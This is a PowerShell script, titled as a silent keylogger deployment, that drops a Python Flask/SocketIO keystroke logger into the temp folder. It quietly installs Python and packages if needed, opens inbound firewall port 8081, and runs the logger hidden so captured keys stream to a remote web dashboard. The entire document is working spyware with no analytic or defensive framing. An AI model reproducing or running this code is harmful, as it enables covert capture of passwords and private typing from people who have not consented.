# Silent keylogger deployment
$pyCode = @"
from flask import Flask, render_template_string
from flask_socketio import SocketIO
import keyboard

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

def on_key_event(event):
    socketio.emit("keystroke", {"key": event.name, "type": event.event_type, "timestamp": str(event.time)})

keyboard.hook(on_key_event)

HTML_TEMPLATE = '''<!DOCTYPE html>
<html>
<head>
    <title>Keyboard Monitor</title>
    <style>
        body { font-family: "Courier New", monospace; background: #0d1117; color: #58a6ff; padding: 20px; margin: 0; }
        h1 { color: #00ff00; border-bottom: 2px solid #00ff00; padding-bottom: 10px; }
        #controls { margin: 20px 0; }
        button { background: #238636; color: white; border: none; padding: 10px 20px; cursor: pointer; margin-right: 10px; border-radius: 5px; }
        button:hover { background: #2ea043; }
        #log { border: 2px solid #30363d; padding: 15px; height: 500px; overflow-y: auto; background: #161b22; border-radius: 5px; }
        .entry { margin: 3px 0; padding: 5px; border-left: 3px solid #58a6ff; padding-left: 10px; }
        .timestamp { color: #8b949e; font-size: 0.9em; }
        .key { color: #00ff00; font-weight: bold; }
        #stats { margin: 10px 0; padding: 10px; background: #161b22; border-radius: 5px; }
    </style>
</head>
<body>
    <h1>Keyboard Monitor</h1>
    <div id="stats">
        <span>Total Keys: <strong id="count">0</strong></span> | 
        <span>Status: <strong id="status" style="color: #00ff00;">Active</strong></span>
    </div>
    <div id="controls">
        <button onclick="clearLog()">Clear Log</button>
        <button onclick="downloadLog()">Download Log</button>
        <button onclick="togglePause()">Pause/Resume</button>
    </div>
    <div id="log"></div>
    <script src="https://cdn.socket.io/4.0.0/socket.io.min.js"></script>
    <script>
        var socket = io();
        var log = document.getElementById("log");
        var keyCount = 0;
        var paused = false;
        var logData = [];
        socket.on("keystroke", function(data) {
            if (paused) return;
            keyCount++;
            document.getElementById("count").textContent = keyCount;
            var entry = document.createElement("div");
            entry.className = "entry";
            var timestamp = new Date(parseFloat(data.timestamp) * 1000).toLocaleTimeString();
            var keyDisplay = data.key;
            if (data.key === "space") keyDisplay = "[SPACE]";
            else if (data.key === "enter") keyDisplay = "[ENTER]";
            else if (data.key === "backspace") keyDisplay = "[BACKSPACE]";
            else if (data.key === "tab") keyDisplay = "[TAB]";
            else if (data.key.indexOf("shift") === 0) keyDisplay = "[SHIFT]";
            else if (data.key.indexOf("ctrl") === 0) keyDisplay = "[CTRL]";
            else if (data.key.indexOf("alt") === 0) keyDisplay = "[ALT]";
            entry.innerHTML = '<span class="timestamp">[' + timestamp + ']</span> <span class="key">' + keyDisplay + '</span>';
            logData.push({timestamp: timestamp, key: keyDisplay});
            log.appendChild(entry);
            log.scrollTop = log.scrollHeight;
        });
        function clearLog() {
            log.innerHTML = "";
            keyCount = 0;
            logData = [];
            document.getElementById("count").textContent = "0";
        }
        function downloadLog() {
            var text = "";
            for (var i = 0; i < logData.length; i++) {
                text += "[" + logData[i].timestamp + "] " + logData[i].key + "\n";
            }
            var blob = new Blob([text], {type: "text/plain"});
            var url = URL.createObjectURL(blob);
            var a = document.createElement("a");
            a.href = url;
            a.download = "keylog_" + Date.now() + ".txt";
            a.click();
        }
        function togglePause() {
            paused = !paused;
            document.getElementById("status").textContent = paused ? "Paused" : "Active";
            document.getElementById("status").style.color = paused ? "#ff6b6b" : "#00ff00";
        }
    </script>
</body>
</html>'''

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE)

if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=8081, debug=False, allow_unsafe_werkzeug=True)
"@

[System.IO.File]::WriteAllText("$env:TEMP\kl.py", $pyCode)

# Find Python
$py = $null
$pyw = $null
@("C:\Program Files\Python311","C:\Program Files\Python312","C:\Python311","C:\Python312") | ForEach-Object {
    if (Test-Path "$_\pythonw.exe") { $py = "$_\python.exe"; $pyw = "$_\pythonw.exe" }
}

if (-not $py) {
    $url = "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe"
    $installer = "$env:TEMP\py.exe"
    Invoke-WebRequest -Uri $url -OutFile $installer -UseBasicParsing
    Start-Process $installer -ArgumentList "/quiet","InstallAllUsers=1","PrependPath=1","Include_pip=1" -Wait
    Remove-Item $installer
    Start-Sleep 5
    $py = "C:\Program Files\Python311\python.exe"
    $pyw = "C:\Program Files\Python311\pythonw.exe"
}

& $py -m pip install keyboard flask flask-socketio --quiet 2>$null
netsh advfirewall firewall add rule name="KL" dir=in action=allow protocol=TCP localport=8081 2>$null | Out-Null

if ($pyw -and (Test-Path $pyw)) {
    Start-Process $pyw -ArgumentList "$env:TEMP\kl.py" -WindowStyle Hidden
} else {
    Start-Process $py -ArgumentList "$env:TEMP\kl.py" -WindowStyle Hidden
}
